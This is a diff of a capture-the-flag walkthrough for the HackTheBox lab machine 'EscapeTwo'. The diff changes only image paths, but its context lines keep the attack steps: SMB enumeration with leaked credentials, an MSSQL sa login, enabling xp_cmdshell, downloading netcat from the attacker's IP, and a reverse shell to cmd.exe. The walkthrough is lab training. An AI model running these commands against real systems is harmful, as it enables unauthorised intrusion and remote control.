@@ -18,7 +18,7 @@ RUN: **sudo nmap -Pn -p- \--min-rate 2000 -sC -sV -oN nmap-scan.txt escapetwo.ht
 
 ALTERNATIVE: **sudo nmap -Pn -p- \--min-rate 5000 \--max-rate 10000 -T4 -sC -sV -oN nmap-aggressive.txt escapetwo.htb**
 
-![](./media/media/image1.png)
+![](EscapeTwo/media/image1.png)
 
 3\. INFO: Get infos on HOSTS, SERVICES, SHARES
 
@@ -26,17 +26,17 @@ INFO: account: rose / KxEPkKe6R8su
 
 RUN: **crackmapexec smb escapetwo.htb -u "rose" -p "KxEPkKe6R8su" \--rid-brute \| grep SidTypeUser**
 
-![](./media/media/image2.png)
+![](EscapeTwo/media/image2.png)
 
 3.1 INFO: add DC01 to hosts file
 
 RUN: **sudo nano /ets/hosts**
 
-![](./media/media/image3.png)
+![](EscapeTwo/media/image3.png)
 
 4\. INFO: Try SMB first. SMB file leak!
 
-![](./media/media/image4.png)
+![](EscapeTwo/media/image4.png)
 
 4.1 INFO: Download accounting_2024.xlsx accounts.xlsx to KALI VM. Open
 
@@ -52,11 +52,11 @@ see CN-SEC.COM solution)
 
 RESULT: FOUND USER:PASSWORD =\> sa:MSSQLP@ssw0rd!
 
-![](./media/media/image5.png)
+![](EscapeTwo/media/image5.png)
 
 Open xlsx-files with LibreOffice Calc or Gnumeric
 
-![](./media/media/image6.png)
+![](EscapeTwo/media/image6.png)
 
 4.2 WORKAROUND for xlsx-files
 
@@ -68,7 +68,7 @@ NEXT: Extract sharedStrings.xml from accounts.xlsx and open it look for
 
 SA-USER and his PASSWORD
 
-![](./media/media/image7.png)
+![](EscapeTwo/media/image7.png)
 
 **FOOTHOLD**
 
@@ -76,7 +76,7 @@ SA-USER and his PASSWORD
 
 RUN WORKED: **impacket-mssqlclient escapetwo.htb/sa:MSSQLP\@ssw0rd\!\@10.10.11.51**
 
-![](./media/media/image8.png)
+![](EscapeTwo/media/image8.png)
 
 **Sa**= System Administrator, **dbo**= Schema, **master**= Current
 
@@ -86,19 +86,19 @@ Database context is master system database
 
 RUN: **xp_cmdshell whoami**
 
-![](./media/media/image9.png)
+![](EscapeTwo/media/image9.png)
 
 5.3 INFO:
 
 RUN: **enable_xp_cmdshell**
 
-![](./media/media/image10.png)
+![](EscapeTwo/media/image10.png)
 
 5.4 INFO: Check USER AGAIN
 
 RUN: **xp_cmdshell whoami**
 
-![](./media/media/image11.png)
+![](EscapeTwo/media/image11.png)
 
 5.5 INFO: Download NETCAT for Windows https://github.com/int0x33/nc.exe/
 
@@ -108,7 +108,7 @@ Kali VM and RUN command on TARGET MACHINE (SERVER)!
 
 RUN on Kali VM: **python3 -m http.server 80**
 
-![](./media/media/image12.png)
+![](EscapeTwo/media/image12.png)
 
 RUN on SERVER: **xp_cmdshell curl 10.10.14.163/nc64.exe -o C:\Users\public\nc64.exe** (Has to be done fast, otherwise STEP 5.3
 
@@ -118,13 +118,13 @@ has to be repeated) 10.10.14.184 is Kali VM IP!
 
 RUN on Kali VM: **nc -lvnp 9999**
 
-![](./media/media/image13.png)
+![](EscapeTwo/media/image13.png)
 
 5.7 INFO: Connects from Server to Kali VM.
 
 RUN on SERVER: **xp_cmdshell C:\Users\public\nc64.exe 10.10.14.163 9999 -e cmd.exe**
 
-![](./media/media/image14.png)
+![](EscapeTwo/media/image14.png)
 
 **GET USER**
 
@@ -146,7 +146,7 @@ RUN on SERVER: **cd ExpressAdv_ENU**
 
 RUN on SERVER: **dir**
 
-![](./media/media/image15.png)
+![](EscapeTwo/media/image15.png)
 
 7.1 INFO: Display file content
 
@@ -154,13 +154,13 @@ RUN on SERVER: **type sql-Configuration.INI** (displays the file in cmd
 
 terminal)
 
-![](./media/media/image16.png)
+![](EscapeTwo/media/image16.png)
 
 7.2 INFO: Search for USERS in directory of the SERVER and try the
 
 PASSWORD from STEP 7.1 to login with
 
-![](./media/media/image17.png)
+![](EscapeTwo/media/image17.png)
 
 7.3 INFO: POWERSHELL remote login
 
